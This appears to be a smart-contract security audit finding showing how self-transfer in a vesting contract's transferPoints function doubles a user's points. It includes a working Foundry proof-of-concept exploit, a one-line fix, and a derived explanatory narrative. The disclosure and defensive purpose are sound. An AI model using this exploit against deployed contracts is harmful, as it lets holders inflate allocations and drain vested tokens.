---
id: 21967
severity: "High"
---

# `AllocationVesting` contract can be exploited for infinite points via self-transfer

## Description

The `AllocationVesting` contract gives points on vesting schedules to team members, investors, influencers and anyone else entitled to a token allocation.

`AllocationVesting::transferPoints` allows users to transfer points however this function does not correctly handle self-transfer meaning users can exploit it by transferring points to themselves, giving themselves infinite points:
```solidity
// update storage - deduct points from `from` using memory cache
allocations[from].points = uint24(fromAllocation.points - points);

// we don't use fromAllocation as it's been modified with _claim()
allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

// @audit doesn't correctly handle self-transfer since the memory
// cache of `toAllocation.points` will still contain the original
// value of `fromAllocation.points`, so this can be exploited by
// self-transfer to get infinite points
//
// update storage - add points to `to` using memory cache
allocations[to].points = toAllocation.points + uint24(points);
```

Anyone entitled to an allocation can give themselves infinite points and hence receive more tokens than they should receive.

## Proof of Concept

Add the following PoC contract to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault, ITokenLocker} from "../TestSetup.sol";
import {AllocationVesting} from "./../../../contracts/dao/AllocationVesting.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AllocationVestingTest is TestSetup {
    AllocationVesting internal allocationVesting;

    uint256 internal constant totalAllocation = 100_000_000e18;
    uint256 internal constant maxTotalPreclaimPct = 10;

    function setUp() public virtual override {
        super.setUp();

        allocationVesting = new AllocationVesting(IERC20(address(babelToken)),
                                                  tokenLocker,
                                                  totalAllocation,
                                                  address(babelVault),
                                                  maxTotalPreclaimPct);
    }

    function test_InfinitePointsExploit() external {
        AllocationVesting.AllocationSplit[] memory allocationSplits
            = new AllocationVesting.AllocationSplit[](2);

        uint24 INIT_POINTS = 50000;

        // allocate to 2 users 50% 50%
        allocationSplits[0].recipient = users.user1;
        allocationSplits[0].points = INIT_POINTS;
        allocationSplits[0].numberOfWeeks = 4;

        allocationSplits[1].recipient = users.user2;
        allocationSplits[1].points = INIT_POINTS;
        allocationSplits[1].numberOfWeeks = 4;

        // setup allocations
        uint256 vestingStart = block.timestamp + 1 weeks;
        allocationVesting.setAllocations(allocationSplits, vestingStart);

        // warp to start time
        vm.warp(vestingStart + 1);

        // attacker transfers their total initial point balance to themselves
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, INIT_POINTS);

        // attacker then has double the points
        (uint24 points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*2);

        // does it again transferring the new larger value
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, points);

        // has double again (4x from the initial points)
        (points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*4);

        // can go on forever to get infinite points
    }
}
```

Comment out the token transfer inside `AllocationVesting::_claim` since the setup is very basic:
```solidity
        // @audit commented out for PoC
        //vestingToken.transferFrom(vault, msg.sender, claimable);
```

Run with: `forge test --match-test test_InfinitePointsExploit`

## Recommendation

Prevent self-transfer in `AllocationVesting::transferPoints`:
```diff
+   error SelfTransfer();

    function transferPoints(address from, address to, uint256 points) external callerOrDelegated(from) {
+       if(from == to) revert SelfTransfer();
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the AllocationVesting contract’s transferPoints function, which is intended to move a limited amount of vesting points from one beneficiary to another. The function reads the sender’s allocation into a memory variable, deducts the requested points, and then writes the updated value back to storage. It also reads the recipient’s allocation into a separate memory variable and adds the transferred points to that value before storing it. Because the code does not treat the case where the sender and the recipient are the same address, the memory cache for the recipient still contains the original point balance of the sender before the deduction occurs. When a user calls transferPoints with from == to, the contract first subtracts the points from the sender’s stored balance, then adds the same amount to the recipient’s balance using the stale cached value, effectively restoring the deducted points and then adding them again. This results in the user’s point balance doubling with each self‑transfer. By repeating the operation, an attacker can increase their points arbitrarily, creating “infinite” points that can later be claimed for an unlimited number of tokens. The flaw is triggered whenever an allocation holder invokes transferPoints without a check against self‑transfer; the function is publicly callable by the holder (or a delegated caller) and contains no guard. The impact is severe: any entitled participant can inflate their vesting points, claim more tokens than the protocol intended, and potentially drain the token supply allocated for vesting. From a user’s perspective the UI would show the expected point balance after a normal transfer, but after a self‑transfer the balance would unexpectedly double, and repeated actions would keep growing the balance, contradicting the expectation that points are conserved. The issue was discovered during a security audit by Cyfrin, which supplied a minimal PoC test that demonstrates the doubling effect. The bug is subtle because self‑transfer appears harmless and the contract does not emit any external token movement during the operation, making the accounting error easy to overlook. The recommended remediation is to add an explicit check that rejects transfers where the source and destination are identical, or to restructure the logic so that the recipient’s balance is read from storage after the sender’s balance has been updated, thereby preventing the stale cache from being used. In essence, the problem belongs to the class of accounting‑state‑inconsistency bugs caused by improper handling of self‑references in mutable state updates.
